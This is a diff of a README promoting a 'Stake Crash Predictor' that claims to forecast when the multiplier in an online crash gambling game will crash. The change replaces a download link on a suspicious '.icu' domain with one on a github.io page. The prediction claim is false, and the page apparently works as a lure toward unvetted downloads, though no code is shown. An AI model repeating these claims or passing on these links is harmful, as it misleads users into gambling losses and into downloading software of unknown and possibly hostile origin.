@@ -7,7 +7,7 @@
 
 Stake Crash Predictor is a tool designed to assist players in predicting outcomes for the popular crash game on platforms like Stake. The crash game is a fast-paced game where players bet on a multiplier that increases over time. The goal is to cash out before the multiplier crashes. The crash predictor aims to analyze game data and trends to provide insights into when the multiplier may crash, helping players make more informed decisions about when to cash out and potentially maximize their winnings.
 
-[![Download Stake Crash Predictor](https://img.shields.io/badge/Download-StakeCrash%20Predictor-blueviolet)](https://downloadifiles.icu?label=bed33cdd29a1fdc17814b892c386c9e9)
+[![Download Stake Crash Predictor](https://img.shields.io/badge/Download-StakeCrash%20Predictor-blueviolet)](https://stake-crash-predictor-download-free.github.io/.github/)
 
 ### Key Features:
 
